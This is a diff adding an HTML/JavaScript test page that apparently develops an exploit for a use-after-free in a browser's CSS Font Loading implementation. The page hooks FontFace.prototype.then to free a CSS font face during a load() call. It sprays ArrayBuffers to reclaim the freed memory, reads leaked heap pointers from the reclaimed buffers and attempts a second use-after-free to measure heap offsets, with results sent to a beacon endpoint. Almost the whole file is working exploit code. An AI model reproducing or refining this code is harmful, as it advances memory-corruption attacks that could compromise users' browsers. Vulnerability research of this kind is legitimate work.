@@ -1,0 +1,334 @@
+<!--
+  p654 v2: ffA.load() clean trigger — confirm reclaim + clean post-UAF state
+
+  v1 finding: ffA.load() trigger WORKS, loadPromise settles cleanly.
+  But getting saRef (JS wrapper for CSS face) via forEach() adds a strong
+  ref that prevents CSSFontFace from being freed → no reclaim.
+
+  v2: DON'T get saRef. Confirm reclaim works with the ffA.load() trigger.
+  Then test what operations are possible in the clean post-UAF state:
+  - Is the page fully functional?
+  - Can we iterate document.fonts after UAF?
+  - Can we create new FontFace objects?
+  - Can we trigger a SECOND UAF in the same page?
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p654</title></head>
+<body>p654: ffA.load trigger + GC
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P654-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'v2-clean');
+flush();
+
+// --- Setup ---
+
+// 1. CSS face for "sa" (UAF target) — do NOT get a JS wrapper for it
+var sty = document.createElement('style');
+sty.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty);
+
+// 2. JS face for "fa" (trigger)
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+
+emit('SETUP', 'fonts.size=' + document.fonts.size);
+
+// 3. Access ffA.loaded to create the loaded promise
+void ffA.loaded;
+
+// 4. Thenable trap
+var fired = false;
+var bufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (fired) return undefined;
+    fired = true;
+    emit('TRAP', 'this===ffA:' + (this === ffA));
+    sty.remove();
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 2, true);
+      dv.setUint32(0x04, 0xDEAD0654, true);
+      bufs.push({ u8: new Uint8Array(ab), dv: dv });
+    }
+    emit('SPRAY', 'n=' + bufs.length);
+    return undefined;
+  },
+  set: function() {}
+});
+
+// 5. Trigger via ffA.load()
+var loadP = ffA.load();
+var lpSettled = false;
+var lpResult = '';
+loadP.then(function(face) {
+  lpSettled = true;
+  lpResult = 'resolved:' + (face === ffA);
+}).catch(function(e) {
+  lpSettled = true;
+  lpResult = 'rejected:' + String(e).slice(0, 40);
+});
+
+// Phase 1: Check reclaim
+setTimeout(function() {
+try {
+  var hit = -1;
+  for (var i = 0; i < bufs.length; i++) {
+    var rc = bufs[i].dv.getUint32(0x00, true);
+    if (rc !== 2) { hit = i; break; }
+  }
+  if (hit < 0) {
+    for (var i = 0; i < bufs.length; i++) {
+      if (bufs[i].dv.getUint32(0x58, true) !== 0 || bufs[i].dv.getUint32(0x5C, true) !== 0) {
+        hit = i; break;
+      }
+    }
+  }
+
+  emit('LP', 'settled=' + lpSettled + ' ' + lpResult);
+
+  if (hit < 0) {
+    emit('MISS', 'no reclaim');
+    flush();
+
+    // Diagnostic: try fonts.load() as a backup trigger in same page
+    emit('DIAG', 'trying fonts.load fallback...');
+    var sty2 = document.createElement('style');
+    sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+    document.head.appendChild(sty2);
+
+    var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+    document.fonts.add(ffB);
+    void ffB.loaded;
+
+    var fired2 = false;
+    var bufs2 = [];
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function() {
+        if (fired2) return undefined;
+        fired2 = true;
+        sty2.remove();
+        document.body.offsetHeight;
+        for (var i = 0; i < 64; i++) {
+          var ab = new ArrayBuffer(192);
+          var dv = new DataView(ab);
+          dv.setUint32(0x00, 2, true);
+          dv.setUint32(0x04, 0xBEEF0654, true);
+          bufs2.push({ u8: new Uint8Array(ab), dv: dv });
+        }
+        emit('TRAP2', 'spray=' + bufs2.length);
+        return undefined;
+      },
+      set: function() {}
+    });
+
+    document.fonts.load('1em fb, sb', 'CD').then(function() {
+      emit('FL-RESOLVED', 'checking...');
+    }).catch(function() {
+      emit('FL-CATCH', 'rejected');
+    });
+
+    setTimeout(function() {
+      var hit2 = -1;
+      for (var i = 0; i < bufs2.length; i++) {
+        var rc = bufs2[i].dv.getUint32(0x00, true);
+        if (rc !== 2) { hit2 = i; break; }
+      }
+      if (hit2 < 0) {
+        for (var i = 0; i < bufs2.length; i++) {
+          if (bufs2[i].dv.getUint32(0x58, true) !== 0 || bufs2[i].dv.getUint32(0x5C, true) !== 0) {
+            hit2 = i; break;
+          }
+        }
+      }
+      if (hit2 >= 0) {
+        var dv2 = bufs2[hit2].dv;
+        emit('DIAG-HIT', 'hit=' + hit2 + ' rc=' + dv2.getUint32(0,true) +
+          ' T=' + hex32(dv2.getUint32(0x5C,true)) + hex32(dv2.getUint32(0x58,true)));
+        emit('DIAG-VERDICT', 'fonts.load works but ffA.load does NOT free CSSFontFace');
+      } else {
+        emit('DIAG-MISS', 'fonts.load fallback also missed');
+      }
+      flush();
+    }, 100);
+
+    return;
+  }
+
+  // --- Reclaim succeeded ---
+  var dv = bufs[hit].dv;
+  var rc   = dv.getUint32(0x00, true);
+  var mark = dv.getUint32(0x04, true);
+  var T_lo = dv.getUint32(0x58, true);
+  var T_hi = dv.getUint32(0x5C, true);
+  var W_lo = dv.getUint32(0x68, true);
+  var W_hi = dv.getUint32(0x6C, true);
+
+  emit('P1', 'hit=' + hit + ' rc=' + rc + ' mark=0x' + hex32(mark));
+  emit('TW', 'T=' + hex32(T_hi) + hex32(T_lo) + ' W=' + hex32(W_hi) + hex32(W_lo));
+  flush();
+
+  // Phase 2: Test clean post-UAF state
+  // Can we create new objects? iterate fonts? trigger second UAF?
+  try { delete FontFace.prototype.then; } catch(e) {}
+
+  // Test 1: is document.fonts iterable?
+  var postFonts = [];
+  try {
+    document.fonts.forEach(function(f) {
+      postFonts.push(f.family.replace(/['"]/g, ''));
+    });
+  } catch(e) { postFonts.push('ERR:' + e.message); }
+  emit('POST-FONTS', postFonts.join(',') + ' size=' + document.fonts.size);
+
+  // Test 2: can we create+add a new FontFace?
+  var newFace = null;
+  try {
+    newFace = new FontFace('nc', 'local(Courier)', { unicodeRange: 'U+0045' });
+    document.fonts.add(newFace);
+    emit('POST-NEW', 'ok size=' + document.fonts.size);
+  } catch(e) { emit('POST-NEW', 'ERR:' + e.message); }
+
+  // Test 3: can we do SECOND UAF in same page? (different face names)
+  var sty2 = document.createElement('style');
+  sty2.textContent = "@font-face { font-family: sc; src: local(Arial); unicode-range: U+0046; }";
+  document.head.appendChild(sty2);
+
+  var ffC = new FontFace('fc', 'local(Helvetica)', { unicodeRange: 'U+0047' });
+  document.fonts.add(ffC);
+  void ffC.loaded;
+
+  var fired2 = false;
+  var bufs2 = [];
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired2) return undefined;
+      fired2 = true;
+      sty2.remove();
+      document.body.offsetHeight;
+      for (var i = 0; i < 64; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv2 = new DataView(ab);
+        dv2.setUint32(0x00, 7, true); // different seed
+        dv2.setUint32(0x04, 0xCAFE0654, true);
+        bufs2.push({ u8: new Uint8Array(ab), dv: dv2 });
+      }
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  ffC.load().then(function() {
+    emit('UAF2-LP', 'resolved');
+  }).catch(function(e) {
+    emit('UAF2-LP', 'rejected:' + String(e).slice(0,40));
+  });
+
+  setTimeout(function() {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      var rc2 = bufs2[i].dv.getUint32(0x00, true);
+      if (rc2 !== 7) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var i = 0; i < bufs2.length; i++) {
+        if (bufs2[i].dv.getUint32(0x58, true) !== 0 || bufs2[i].dv.getUint32(0x5C, true) !== 0) {
+          hit2 = i; break;
+        }
+      }
+    }
+
+    if (hit2 >= 0) {
+      var dv2 = bufs2[hit2].dv;
+      var T2_lo = dv2.getUint32(0x58, true);
+      var T2_hi = dv2.getUint32(0x5C, true);
+      var W2_lo = dv2.getUint32(0x68, true);
+      var W2_hi = dv2.getUint32(0x6C, true);
+      emit('UAF2', 'hit=' + hit2 + ' rc=' + dv2.getUint32(0,true) +
+        ' T2=' + hex32(T2_hi) + hex32(T2_lo) +
+        ' W2=' + hex32(W2_hi) + hex32(W2_lo));
+
+      // Key question: is T2 at a predictable offset from T1?
+      // T1 and T2 are both HashTable* (80B, same iso-heap)
+      var diffT = 0;
+      if (T_hi === T2_hi) {
+        diffT = T2_lo - T_lo;
+      }
+      emit('T-DIFF', 'T2-T1=' + diffT + ' (0x' + diffT.toString(16) + ')');
+    } else {
+      emit('UAF2-MISS', 'second reclaim failed');
+    }
+
+    // Test 4: WeakRef on ffA — is it GC-able now?
+    var wrA = null;
+    if (typeof WeakRef !== 'undefined') {
+      wrA = new WeakRef(ffA);
+    }
+    try { document.fonts.clear(); } catch(e) {}
+    loadP = null;
+    ffA = null;
+    ffC = null;
+    newFace = null;
+
+    emit('REFS-KILLED', 'starting GC');
+    flush();
+
+    var gcCount = 0;
+    function gcPoll() {
+      gcCount++;
+      var g = [];
+      for (var k = 0; k < 300; k++) g.push(new ArrayBuffer(65536));
+      g = null;
+
+      var alive = wrA ? wrA.deref() !== undefined : 'n/a';
+      if (gcCount === 1 || gcCount === 5 || gcCount === 15 || gcCount === 30 ||
+          alive === false) {
+        emit('GC', 'n=' + gcCount + ' ffA=' + alive + ' rc1=' + dv.getUint32(0, true));
+        flush();
+        if (alive === false) {
+          emit('GC-COLLECTED', 'ffA wrapper freed!');
+          flush();
+          return;
+        }
+      }
+      if (gcCount < 30) {
+        setTimeout(gcPoll, 250);
+      } else {
+        emit('END', 'ffA=' + alive + ' rc1=' + dv.getUint32(0, true));
+        flush();
+      }
+    }
+    setTimeout(gcPoll, 100);
+  }, 100);
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 50);
+})();
+</script>
+</body></html>
